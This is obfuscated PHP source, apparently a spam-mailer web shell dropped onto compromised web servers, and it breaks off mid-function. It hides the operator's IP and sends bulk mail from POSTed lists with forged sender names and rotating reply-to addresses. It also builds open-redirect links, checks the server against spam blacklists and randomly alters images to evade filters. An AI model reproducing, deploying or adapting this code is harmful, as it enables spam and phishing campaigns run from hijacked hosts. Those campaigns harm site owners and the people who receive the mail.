@error_reporting(round(0));@set_time_limit(round(0+50+50+50));@ignore_user_abort(true);@ini_set('max_execution_time',round(0+37.5+37.5+37.5+37.5));if(isset($_REQUEST['r'])){$n_st='';$n_st1='';$n_st2='?';$d_st=base64_decode($_REQUEST['r']);$d_st1=explode('&',trim($d_st));for($i=round(0);$i<sizeof($d_st1);$i++){$d_st2=explode('=',trim($d_st1[$i]));if($d_st2[round(0)]=='l'){$n_st=$d_st2[round(0+0.33333333333333+0.33333333333333+0.33333333333333)];}else{$n_st1.=$n_st2 .$d_st2[round(0)] .'=' .$d_st2[round(0+0.5+0.5)];$n_st2='&';};};$n_st.=$n_st1; ?> <meta http-equiv="refresh" content="0;url=<?php echo $n_st; ?>"><?php exit();
}
if (isset($_REQUEST['u']))
{
    $n_st = '';
    $n_st1 = '';
    $n_st2 = '?';
    $d_st = base64_decode($_REQUEST['u']);
    file_put_contents('logsubsc.log', date('[Y-m-d H:i:s] ') . $d_st . "\r\n", FILE_APPEND | LOCK_EX); ?> <br><br><br><center>You have unsubscribed from the newsletter!!!</center><br><center>Email: <b><?php echo $d_st; ?></b></center> <?php
}
if (isset($_REQUEST['lu']))
{
    $file_contents = file_get_contents('logsubsc.log');
    $file_contents = preg_replace("/\n/", "<br/>\n", $file_contents);
    echo $file_contents;
}
if (isset($_REQUEST['du']))
{
    unlink('logsubsc.log');
}
$randString = rand(round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) , round(0 + 63.75 + 63.75 + 63.75 + 63.75)) . '.' . rand(round(0) , round(0 + 85 + 85 + 85)) . '.' . rand(round(0) , round(0 + 63.75 + 63.75 + 63.75 + 63.75)) . '.' . rand(round(0) , round(0 + 63.75 + 63.75 + 63.75 + 63.75));
$compare = $_SERVER['REMOTE_ADDR'];
while ($key = key($_SERVER))
{
    if ($_SERVER[$key] == $compare)
    {
        @$_SERVER[$key] = $randString;
    }
    next($_SERVER);
}
if (isset($_POST['ch']) === true)
{
    Check();
    exit;
}
if (isset($_POST['sn']) === true)
{
    Send();
    exit;
}
function Send()
{
    $replyto = urldecode($_POST['rpt']);
    if (strstr($replyto, '|'))
    {
        $rand = explode('|', $replyto);
        $replyto = $rand[array_rand($rand) ];
    }
    $domain = $_SERVER["HTTP_HOST"];
    $domain = str_replace('www.', '', $domain);
    $domain_ = explode('.', $domain);
    $_POST['m'] = str_replace('[shelldomain:]', ucfirst($domain_[round(0) ]) , $_POST['m']);
    $replyto = check_gmail($replyto);
    $emails = urldecode($_POST['em']);
    $ex = explode("\n", $emails);
    global $randm_array;
    global $attachement_array;
    global $unsubscribe;
    $unsubscribe = round(0);
    {
        for ($c = round(0) , $max = sizeof($ex);$c < $max;$c++)
        {
            $data = explode('|', trim($ex[$c]));
            $r_from_ = Random(dataHandler($_POST['f']) , $data);
            $r_from = explode(':', $r_from_);
            if (is_file($_FILES['file']['tmp_name']))
            {
                $r_subject = dataHandler(urldecode($_POST['s']));
                $r_message = urldecode($_POST['m']);
            }
            else
            {
                $r_subject = dataHandler($_POST['s']);
                $r_message = $_POST['m'];
            };
            $r_subject = str_ireplace('[from:]', $r_from[round(0) ], $r_subject);
            $r_subject = str_ireplace('[email:]', $data[round(0) ], $r_subject);
            $r_subject = Random($r_subject, $data);
            $r_message = str_ireplace('[from:]', $r_from[round(0) ], $r_message);
            $r_message = str_ireplace('[email:]', $data[round(0) ], $r_message);
            $r_message = Random($r_message, $data);
            if (!SMail($data[round(0) ], $r_from[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ], $r_message, $r_subject, $replyto, $r_from[round(0) ]))
            {
                print '*send:bad*';
                exit;
            }
        }
    };
    print '*send:ok*';
    exit;
}
function SMail($to, $from, $message, $subject, $replyto, $from_name)
{
    global $unsubscribe;
    if (is_file($_FILES['file']['tmp_name']))
    {
        $fileString = fileString($_FILES['file']['name']);
        $filename = $_POST['fn'];
    };
    global $attachement_array;
    $boundary = md5(uniqid());
    $headers = "MIME-Version: 1.0\r\n";
    $from_name = trim($from_name);
    if (strlen(trim($from_name)) < round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333))
    {
        $from_name = randText();
    };
    if (strlen(trim($from)) < round(0 + 0.5 + 0.5))
    {
        $from = str_replace(' ', '', trim(rus2translit($from_name))) . '@' . $_SERVER['HTTP_HOST'];
    };
    if (strlen(trim($replyto)) < round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333))
    {
        $replyto = $from;
    };
    if ($_POST['tp'] == '1')
    {
        $type = 'text/html';
    }
    else
    {
        $type = 'text/plain';
    }
    $headers .= "Content-Type: multipart/alternative;boundary=" . $boundary . "\r\n";
    $headers .= 'From: ' . '=?utf-8?B?' . base64_encode($from_name) . '?=' . ' <' . $from . '>' . "\r\n";
    $headers .= 'Reply-To: ' . $replyto . "\r\n";
    if ($unsubscribe == round(0 + 0.5 + 0.5))
    {
        $headers .= 'List-Unsubscribe: <mailto:' . $from . ">" . "\r\n";
    };
    $body = "Content-type: text/plain;charset=koi8-r\r\n";
    $body = "";
    $body .= "\r\n\r\n--" . $boundary . "\r\n";
    $body .= "Content-type: text/plain;charset=utf-8\r\n";
    $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
    $message1 = cut_tags($message);
    $body .= chunk_split(base64_encode($message1));
    if ($_POST['tp'] == '1')
    {
        $body .= "\r\n\r\n--" . $boundary . "\r\n";
        $body .= "Content-type: " . $type . ";charset=utf-8\r\n";
        $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
        $body .= chunk_split(base64_encode($message));
    };
    if (is_file($_FILES['file']['tmp_name']))
    {
        $body .= '--' . $boundary . "\r\n";
        $body .= 'Content-Type: ' . $_FILES['file']['type'] . '; name="' . $filename . '"' . "\r\n";
        $body .= 'Content-Disposition: attachment; filename="' . $filename . '"' . "\r\n";
        $body .= 'Content-Transfer-Encoding: base64' . "\r\n";
        $body .= 'X-Attachment-Id: ' . rand(round(0 + 250 + 250 + 250 + 250) , round(0 + 24999.75 + 24999.75 + 24999.75 + 24999.75)) . "\r\n\r\n";
        $body .= chunk_split(base64_encode($fileString));
    };
    $files;
    for ($i = round(0);$i < count($attachement_array);$i++)
    {
        $attachement_array[$i][round(0 + 0.5 + 0.5) ] = trim($attachement_array[$i][round(0 + 1) ]);
        file_put_contents($attachement_array[$i][round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ], file_get_contents($attachement_array[$i][round(0) ]));
    };
    for ($i = round(0);$i < count($attachement_array);$i++)
    {
        if (isset($attachement_array[$i][round(0 + 0.5 + 0.5) ]))
        {
            $fp = fopen($attachement_array[$i][round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ], "r");
            if ($fp)
            {
                $files[$i] = fread($fp, filesize($attachement_array[$i][round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]));
            };
            fclose($fp);
            if (isset($files[$i]))
            {
                $body .= "\r\n\r\n--" . $boundary . "\r\n";
                $body .= 'Content-Type: ' . mime_content_type($attachement_array[$i][round(0 + 1) ]) . '; name="' . $attachement_array[$i][round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ] . '"' . "\r\n";
                $body .= 'Content-Disposition: attachment; filename="' . $attachement_array[$i][round(0 + 0.25 + 0.25 + 0.25 + 0.25) ] . '"' . "\r\n";
                $body .= 'Content-Transfer-Encoding: base64' . "\r\n";
                $body .= 'X-Attachment-Id: ' . rand(round(0 + 333.33333333333 + 333.33333333333 + 333.33333333333) , round(0 + 49999.5 + 49999.5)) . "\r\n\r\n";
                $body .= chunk_split(base64_encode(fileString2($attachement_array[$i][round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ])));
                unlink($attachement_array[$i][round(0 + 1) ]);
            };
        };
    };
    $body .= "\r\n\r\n--" . $boundary . "--";
    $subject = '=?utf-8?B?' . base64_encode($subject) . '?=';
    if (mail($to, $subject, $body, $headers))
    {
        return true;
    }
    return false;
}
function dataHandler($data)
{
    $ex = explode("\n", $data);
    if (sizeof($ex) > round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2))
    {
        return trim($ex[rand(round(0) , sizeof($ex) - round(0 + 0.5 + 0.5)) ]);
    }
    return trim($data);
}
function Random($text, $data)
{
    global $randm_array;
    global $attachement_array;
    global $unsubscribe;
    preg_match_all('#\[num:(.+?)\]#is', $text, $result2);
    $i = round(0);
    preg_match_all('#\[randM:(.+?)\]#is', $text, $result3);
    $q = round(0);
    preg_match_all('#\[randstr:(.+?)\]#is', $text, $result4);
    $w = round(0);
    preg_match_all('#\[var:(.+?)\]#is', $text, $result5);
    $e = round(0);
    preg_match_all('#\{rand:(.+?)\}#is', $text, $result6);
    $f = round(0);
    preg_match_all('#\[redirect:(.+?)\]#is', $text, $result7);
    $h = round(0);
    preg_match_all('#\{randM:(.+?)\}#is', $text, $result8);
    $u = round(0);
    while ($h < sizeof($result7[round(0 + 1) ]))
    {
        $link_site = '';
        $link_par1 = explode('>>>', $result7[round(0 + 0.5 + 0.5) ][$h]);
        $current_url_ = '';
        preg_match_all('#\{rand:(.+?)\}#is', $link_par1[round(0) ], $link_par2);
        if (sizeof($link_par2[round(0 + 0.5 + 0.5) ]) > round(0))
        {
            $link_par3 = explode('|', $link_par2[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ][round(0) ]);
            $link_site = $link_par3[array_rand($link_par3) ];
        }
        else
        {
            $link_site = $link_par1[round(0) ];
        };
        $link_site = "l=" . $link_site;
        for ($i_link = round(0 + 0.5 + 0.5);$i_link < sizeof($link_par1);$i_link++)
        {
            $link_par1[$i_link] = str_replace("{", "", $link_par1[$i_link]);
            $link_par1[$i_link] = str_replace("}", "", $link_par1[$i_link]);
            if (strpos($link_par1[$i_link], 'email:') !== false)
            {
                $link_site .= "&e=" . trim($data[round(0) ]);
            }
            else if (strpos($link_par1[$i_link], 'var:') !== false)
            {
                $link_par4 = explode(':', $link_par1[$i_link]);
                $link_site .= "&v" . $link_par4[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ] . "=" . trim($data[$link_par4[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]]);
            }
            else if (strpos($link_par1[$i_link], 'link:') !== false)
            {
                $link_par4 = explode(':', $link_par1[$i_link], round(0 + 1 + 1));
                $current_url_ = $link_par4[round(0 + 1) ];
            }
            else
            {
                $link_site .= "&" . $link_par1[$i_link];
            };
        };
        if (strlen($current_url_) > round(0))
        {
            $current_url = $current_url_;
        }
        else
        {
            $current_url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        };
        $current_url .= "?r=" . base64_encode($link_site);
        $text = str_replace_once($result7[round(0) ][$h], $current_url, $text);
        $h++;
    }
    $k = strpos($text, '[unsubscribe:]');
    if ($k != false)
    {
        $current_url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $current_url .= "?u=" . base64_encode($data[round(0) ]);
        $unsubscribe = round(0 + 0.5 + 0.5);
        $text = str_replace('[unsubscribe:]', $current_url, $text);
    }
    while ($f < sizeof($result6[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
    {
        $rand = explode('|', $result6[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ][$f]);
        $rand = $rand[array_rand($rand) ];
        $text = str_replace_once($result6[round(0) ][$f], $rand, $text);
        $f++;
    }
    while ($i < sizeof($result2[round(0 + 1) ]))
    {
        $rand = explode('|', $result2[round(0 + 0.5 + 0.5) ][$i]);
        if (!is_numeric($rand[round(0) ]) or !is_numeric($rand[round(0 + 0.5 + 0.5) ]))
        {
            continue;
        }
        $rand = rand($rand[round(0) ], $rand[round(0 + 1) ]);
        $text = str_replace_once($result2[round(0) ][$i], $rand, $text);
        $i++;
    }
    while ($u < sizeof($result8[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
    {
        $rand = explode('|', $result8[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ][$u]);
        $flag_r = false;
        for ($i_link = round(0);$i_link < sizeof($result8[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]);$i_link++)
        {
            if ($result8[round(0) ][$u] == $randm_array[$i_link][round(0) ])
            {
                $rand = $randm_array[$i_link][round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ];
                $flag_r = true;
                break;
            };
        };
        if ($flag_r == false)
        {
            $rand = $rand[array_rand($rand) ];
            $randm_array[] = array(
                $result3[round(0) ][$u],
                $rand
            );
        };
        $text = str_replace($result8[round(0) ][$u], $rand, $text);
        $u++;
    }
    while ($q < sizeof($result3[round(0 + 0.5 + 0.5) ]))
    {
        $rand = explode('|', $result3[round(0 + 1) ][$q]);
        $flag_r = false;
        for ($i_link = round(0);$i_link < sizeof($result3[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ]);$i_link++)
        {
            if ($result3[round(0) ][$q] == $randm_array[$i_link][round(0) ])
            {
                $rand = $randm_array[$i_link][round(0 + 0.25 + 0.25 + 0.25 + 0.25) ];
                $flag_r = true;
                break;
            };
        };
        if ($flag_r == false)
        {
            $rand = $rand[array_rand($rand) ];
            $randm_array[] = array(
                $result3[round(0) ][$q],
                $rand
            );
        };
        $text = str_replace($result3[round(0) ][$q], $rand, $text);
        $q++;
    }
    while ($w < sizeof($result4[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ]))
    {
        $rand = explode('|', $result4[round(0 + 0.5 + 0.5) ][$w]);
        if (!is_numeric($rand[round(0) ]) or !is_numeric($rand[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
        {
            continue;
        }
        $rand = randString($rand[round(0) ], $rand[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ]);
        $text = str_replace_once($result4[round(0) ][$w], $rand, $text);
        $w++;
    }
    while ($e < sizeof($result5[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ]))
    {
        if (!is_numeric($result5[round(0 + 0.5 + 0.5) ][$e]))
        {
            continue;
        }
        $text = str_replace($result5[round(0) ][$e], $data[$result5[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ][$e]], $text);
        $e++;
    }
    preg_match_all('#\[rand:(.+?)\]#is', $text, $result);
    $c = round(0);
    while ($c < sizeof($result[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
    {
        $rand = explode('|', $result[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ][$c]);
        $rand = $rand[array_rand($rand) ];
        $text = str_replace_once($result[round(0) ][$c], $rand, $text);
        $c++;
    }
    $p = strpos($text, 'spoof:');
    if ($p != false)
    {
        $text = str_replace('[spoof:', ':', $text);
        $text = str_replace(']', '', $text);
    };
    $text = str_replace('{var:}', '{var:1}', $text);
    $text = str_replace('{email:}', trim($data[round(0) ]) , $text);
    preg_match_all('#\[base64:(.+?)\]#is', $text, $result12);
    $h2 = round(0);
    while ($h2 < sizeof($result12[round(0 + 1) ]))
    {
        $result12_text = $result12[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ][$h2];
        preg_match_all('#\{var:(.+?)\}#is', $result12_text, $result12_var);
        $h2_var = round(0);
        while ($h2_var < sizeof($result12_var[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
        {
            if (is_numeric($result12_var[round(0 + 0.5 + 0.5) ][$h2_var]))
            {
                $result12_text = str_replace_once($result12_var[round(0) ][$h2_var], $data[$result12_var[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ][$h2_var]], $result12_text);
            };
            $h2_var++;
        };
        $text = str_replace_once($result12[round(0) ][$h2], base64_encode($result12_text) , $text);
        $h2++;
    }
    preg_match_all('#\[attachment:(.+?)\]#is', $text, $result9);
    $d = round(0);
    while ($d < sizeof($result9[round(0 + 0.5 + 0.5) ]))
    {
        $attachement_array0 = explode('>>>', $result9[round(0 + 0.5 + 0.5) ][$d]);
        $attachement_array[] = $attachement_array0;
        $text = str_replace_once($result9[round(0) ][$d], "", $text);
        $d++;
    }
    preg_match_all('#\[attachmentM:(.+?)\]#is', $text, $result10);
    $s = round(0);
    while ($s < sizeof($result10[round(0 + 1) ]))
    {
        $attachement_array0 = explode('>>>', $result10[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ][$s]);
        preg_match_all('#\((.+?)\)#is', $attachement_array0[round(0) ], $result11);
        $s1 = round(0);
        while ($s1 < sizeof($result11[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ]))
        {
            $attachement_array1 = explode(',', $result11[round(0 + 1) ][$s1]);
            $attachement_array1_ = rand(intval($attachement_array1[round(0) ]) , intval($attachement_array1[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ]) - round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2));
            $attachement_array0[round(0) ] = str_replace_once($result11[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ][$s1], $attachement_array1_, $attachement_array0[round(0) ]);
            $attachement_array0[round(0) ] = str_replace('(', '', $attachement_array0[round(0) ]);
            $attachement_array0[round(0) ] = str_replace(')', '', $attachement_array0[round(0) ]);
            $s1++;
        };
        $attachement_array[] = $attachement_array0;
        $text = str_replace_once($result10[round(0) ][$s], "", $text);
        $s++;
    }
    preg_match_all('#\[image64:(.+?)\]#is', $text, $result13);
    $d2 = round(0);
    $image64_file = 'image64_file.png';
    $image64_file_ = '';
    while ($d2 < sizeof($result13[round(0 + 0.25 + 0.25 + 0.25 + 0.25) ]))
    {
        file_put_contents($image64_file, file_get_contents($result13[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ][$d2]));
        $fp = fopen($image64_file, "r");
        if ($fp)
        {
            $image64_file_ = fread($fp, filesize($image64_file));
        };
        fclose($fp);
        $result13_text = 'data:' . mime_content_type($image64_file) . ';base64,' . chunk_split(base64_encode($image64_file_)) . '';
        $text = str_replace_once($result13[round(0) ][$d2], $result13_text, $text);
        unlink($image64_file);
        $d2++;
    }
    return $text;
}
function Check()
{
    $crlf = "\r\n";
    if (isset($_POST['st']) === true)
    {
        print '*valid:ok*' . $crlf;
    }
    if (isset($_POST['m']) === true)
    {
        if (function_exists('mail'))
        {
            $ex = explode(':', $_POST['m']);
            $email = $ex[round(0) ];
            $attach = $ex[round(0 + 1) ];
            $reply = $ex[round(0 + 0.5 + 0.5 + 0.5 + 0.5) ];
            $from_name = randText();
            $replyto = $from_name . '@' . $_SERVER['HTTP_HOST'];
            if ($reply == '1')
            {
                $replyto = $email;
            }
            if ($attach == '1')
            {
                if (CheckAttach($email, $replyto, $from_name))
                {
                    print '*mail:ok*' . $crlf;
                }
                else
                {
                    print '*mail:bad*' . $crlf;
                }
            }
            else
            {
                if (CheckMail($email, $replyto, $from_name))
                {
                    print '*mail:ok*' . $crlf;
                }
                else
                {
                    print '*mail:bad*' . $crlf;
                }
            }
        }
        else
        {
            print '*mail:bad*' . $crlf;
        }
    }
    if (isset($_POST['rb']) === true)
    {
        $rbl = rbl();
        if ($rbl == '')
        {
            print '*rbl:ok*';
        }
        else
        {
            print '*rbl:' . $rbl . '*';
        }
    }
}
function randString($min, $max)
{
    $str = 'qwertyuiopasdfghjklzxcvbnm';
    $size = rand($min, $max);
    $result = '';
    for ($c = round(0);$c < $size;$c++)
    {
        $result .= $str{rand(round(0) , strlen($str) - round(0 + 0.25 + 0.25 + 0.25 + 0.25)) };
    }
    return $result;
}
function rbl()
{
    $dnsbl_check = array(
        'b.barracudacentral.org',
        'xbl.spamhaus.org',
        'sbl.spamhaus.org',
        'zen.spamhaus.org',
        'bl.spamcop.net'
    );
    $ip = gethostbyname($_SERVER['HTTP_HOST']);
    $result = '';
    if ($ip)
    {
        $rip = implode('.', array_reverse(explode('.', $ip)));
        foreach ($dnsbl_check as $val)
        {
            if (checkdnsrr($rip . '.' . $val . '.', 'A')) $result .= $val . ', ';
        }
        if (strlen($result) > round(0 + 1 + 1))
        {
            return substr($result, round(0) , -round(0 + 0.4 + 0.4 + 0.4 + 0.4 + 0.4));
        }
        else
        {
            return '';
        }
    }
    else
    {
        return '*rbl:unknown*';
    }
    return '';
}
function CheckMail($to, $reply, $from_name)
{
    $header = 'From: ' . '=?utf-8?B?' . base64_encode(randText()) . '?=' . ' <' . $from_name . '@' . $_SERVER['HTTP_HOST'] . ">\r\n";
    $header .= 'MIME-Version: 1.0' . "\r\n";
    $header .= 'Content-Type: text/html; charset="utf-8"' . "\r\n";
    $header .= 'Reply-To: ' . $reply . "\r\n";
    $header .= 'X-Mailer: PHP/' . phpversion();
    $message = text();
    $subject = $_SERVER['HTTP_HOST'];
    if (mail($to, $subject, $message, $header))
    {
        return true;
    }
    return false;
}
function cut_tags($message)
{
    $message1 = trim(strip_tags($message, '<a>'));
    $find_a = True;
    $message1_ = array();
    $find_a_i = array();
    $find_a_i[round(0) ] = round(0);
    while ($find_a == True)
    {
        $find_a_i[round(0) ] = strpos($message1, '<a', $find_a_i[round(0) ]);
        if ($find_a_i[round(0) ] != False)
        {
            $find_a_i[round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) ] = strpos($message1, 'href', $find_a_i[round(0) ] + round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333));
            $find_a_i[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ] = strpos($message1, '"', $find_a_i[round(0 + 1) ] + round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2));
            $find_a_i[round(0 + 2) ] = strpos($message1, '"', $find_a_i[round(0 + 0.5 + 0.5) ] + round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2));
            $find_a_i[round(0 + 1.5 + 1.5) ] = strpos($message1, '</', $find_a_i[round(0 + 0.5 + 0.5 + 0.5 + 0.5) ] + round(0 + 0.25 + 0.25 + 0.25 + 0.25));
            $find_a_i[round(0 + 0.6 + 0.6 + 0.6 + 0.6 + 0.6) ] = strpos($message1, '>', $find_a_i[round(0 + 1.5 + 1.5) ] + round(0 + 0.5 + 0.5));
            $find_a_i[round(0 + 1.3333333333333 + 1.3333333333333 + 1.3333333333333) ] = strlen($message1) - round(0 + 0.25 + 0.25 + 0.25 + 0.25);
            $message1_[round(0) ] = substr($message1, round(0) , $find_a_i[round(0) ]);
            $message1_[round(0 + 0.5 + 0.5) ] = substr($message1, $find_a_i[round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) ] + round(0 + 0.25 + 0.25 + 0.25 + 0.25) , $find_a_i[round(0 + 0.5 + 0.5 + 0.5 + 0.5) ] - $find_a_i[round(0 + 1) ] - round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2));
            $message1_[round(0 + 0.66666666666667 + 0.66666666666667 + 0.66666666666667) ] = substr($message1, $find_a_i[round(0 + 0.6 + 0.6 + 0.6 + 0.6 + 0.6) ] + round(0 + 1) , $find_a_i[round(0 + 2 + 2) ] - $find_a_i[round(0 + 1.5 + 1.5) ] + round(0 + 1));
            $message1 = $message1_[round(0) ] . $message1_[round(0 + 0.5 + 0.5) ] . $message1_[round(0 + 0.5 + 0.5 + 0.5 + 0.5) ];
        }
        else
        {
            $find_a = False;
        };
    };
    return $message1;
};
function CheckAttach($to, $reply, $from_name)
{
    $message = text();
    $subject = $_SERVER['HTTP_HOST'];
    $filename = filename('1.txt');
    $boundary = md5(uniqid());
    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'From: ' . '=?utf-8?B?' . base64_encode(randText()) . '?=' . ' <' . $from_name . '@' . $_SERVER['HTTP_HOST'] . '>' . "\r\n";
    $headers .= 'Reply-To: ' . $reply . "\r\n";
    $headers .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
    $headers .= 'Content-Type: multipart/mixed; boundary="' . $boundary . "\"\r\n\r\n";
    $body = '--' . $boundary . "\r\n";
    $body .= 'Content-Type: text/html; charset="utf-8"' . "\r\n";
    $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
    $body .= chunk_split(base64_encode($message));
    if ($_POST['tp'] == '1')
    {
        $message1 = cut_tags($message);
        $body .= '--' . $boundary . "\r\n";
        $body .= 'Content-Type: text/plain; charset="utf-8"' . "\r\n";
        $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
        $body .= chunk_split(base64_encode($message1));
    };
    $body .= '--' . $boundary . "\r\n";
    $body .= 'Content-Type: text/plain; name="' . $filename . '"' . "\r\n";
    $body .= 'Content-Disposition: attachment; filename="' . $filename . '"' . "\r\n";
    $body .= 'Content-Transfer-Encoding: base64' . "\r\n";
    $body .= 'X-Attachment-Id: ' . rand(round(0 + 200 + 200 + 200 + 200 + 200) , round(0 + 49999.5 + 49999.5)) . "\r\n\r\n";
    $body .= chunk_split(base64_encode(text()));
    if (mail($to, $subject, $body, $headers))
    {
        return true;
    }
    return false;
}
function str_replace_once($search, $replace, $text)
{
    $pos = strpos($text, $search);
    return $pos !== false ? substr_replace($text, $replace, $pos, strlen($search)) : $text;
}
function filename($name)
{
    $format = end(explode('.', $name));
    $array[] = 'SDC';
    $array[] = 'P';
    $array[] = 'DC';
    $array[] = 'CAM';
    $array[] = 'IMG-';
    $img = array(
        'png',
        'jpg',
        'gif',
        'jpeg',
        'bmp'
    );
    for ($c = round(0) , $max = sizeof($img);$c < $max;$c++)
    {
        if (strtolower($format) == $img[$c])
        {
            $rand = rand(round(0 + 3.3333333333333 + 3.3333333333333 + 3.3333333333333) , round(0 + 333333 + 333333 + 333333));
            return $array[rand(round(0) , round(0 + 1.3333333333333 + 1.3333333333333 + 1.3333333333333)) ] . $rand . '.' . $format;
        }
    }
    return randText() . '.' . $format;
}
function fileString2($name)
{
    return file_get_contents($name);
}
function fileString($name)
{
    $format = end(explode('.', $name));
    if (strtolower($format) == 'jpeg' or strtolower($format) == 'jpg')
    {
        if (CheckRandIMG())
        {
            return RandIMG($_FILES['file']['tmp_name']);
        }
    }
    return file_get_contents($_FILES['file']['tmp_name']);
}
function randText()
{
    $str = 'qwertyuiopasdfghjklzxcvbnm';
    $size = rand(round(0 + 3) , round(0 + 2 + 2 + 2 + 2));
    $result = '';
    for ($c = round(0);$c < $size;$c++)
    {
        $result .= $str{rand(round(0) , strlen($str) - round(0 + 1)) };
    }
    return $result;
}
function text()
{
    $str = 'qwertyuiopasdfghjklzxcvbnm';
    $size = rand(round(0 + 1.8 + 1.8 + 1.8 + 1.8 + 1.8) , round(0 + 6.6666666666667 + 6.6666666666667 + 6.6666666666667));
    $result = '';
    for ($c = round(0);$c < $size;$c++)
    {
        $rand = rand(round(0 + 1.2 + 1.2 + 1.2 + 1.2 + 1.2) , round(0 + 2.5 + 2.5 + 2.5 + 2.5));
        for ($i = round(0);$i < $rand;$i++)
        {
            $result .= $str{rand(round(0) , strlen($str) - round(0 + 1)) };
        }
        $sign = array(
            ' ',
            ' ',
            ' ',
            ' ',
            ', ',
            '? ',
            '. ',
            '. '
        );
        $result .= $sign[rand(round(0) , round(0 + 3.5 + 3.5)) ];
    }
    return trim($result);
}
function CheckRandIMG()
{
    $array = array(
        'getimagesize',
        'imagecreatetruecolor',
        'imagecreatefromjpeg',
        'imagecopyresampled',
        'imagefilter',
        'ob_start',
        'imagejpeg',
        'ob_get_clean'
    );
    for ($c = round(0) , $max = sizeof($array);$c < $max;$c++)
    {
        if (!function_exists($array[$c]))
        {
            return false;
        }
    }
    return true;
}
function RandIMG($file)
{
    $rand['width'] = rand(round(0 + 0.5 + 0.5) , round(0 + 0.66666666666667 + 0.66666666666667 + 0.66666666666667));
    $rand['height'] = rand(round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) , round(0 + 1 + 1));
    $rand['quality'] = rand(round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) , round(0 + 0.4 + 0.4 + 0.4 + 0.4 + 0.4));
    $rand['brightness'] = rand(round(0 + 1) , round(0 + 1 + 1));
    $rand['contrast'] = rand(round(0 + 0.5 + 0.5) , round(0 + 1 + 1));
    list($width, $height) = getimagesize($file);
    if ($rand['width'] == round(0 + 1))
    {
        $sign = rand(round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) , round(0 + 1 + 1));
        if ($sign == round(0 + 0.5 + 0.5))
        {
            $new_width = $width + rand(round(0 + 0.25 + 0.25 + 0.25 + 0.25) , round(0 + 2 + 2 + 2 + 2 + 2));
        }
        else
        {
            $new_width = $width - rand(round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333) , round(0 + 2 + 2 + 2 + 2 + 2));
        }
    }
    else
    {
        $new_width = $width;
    }
    if ($rand['height'] == round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333))
    {
        $sign = rand(round(0 + 0.2 + 0.2 + 0.2 + 0.2 + 0.2) , round(0 + 0.4 + 0.4 + 0.4 + 0.4 + 0.4));
        if ($sign == round(0 + 0.25 + 0.25 + 0.25 + 0.25))
        {
            $new_height = $height + rand(round(0 + 0.5 + 0.5) , round(0 + 2 + 2 + 2 + 2 + 2));
        }
        else
        {
            $new_height = $height - rand(round(0 + 1) , round(0 + 10));
        }
    }
    else
    {
        $new_height = $height;
    }
    if ($rand['quality'] == round(0 + 0.5 + 0.5))
    {
        $quality = round(0 + 18.75 + 18.75 + 18.75 + 18.75);
    }
    else
    {
        $quality = rand(round(0 + 21.666666666667 + 21.666666666667 + 21.666666666667) , round(0 + 35 + 35 + 35));
    }
    if ($rand['brightness'] == round(0 + 0.25 + 0.25 + 0.25 + 0.25))
    {
        $brightness = rand(round(0) , round(0 + 8.75 + 8.75 + 8.75 + 8.75));
    }
    else
    {
        $brightness = round(0);
    }
    if ($rand['contrast'] == round(0 + 0.25 + 0.25 + 0.25 + 0.25))
    {
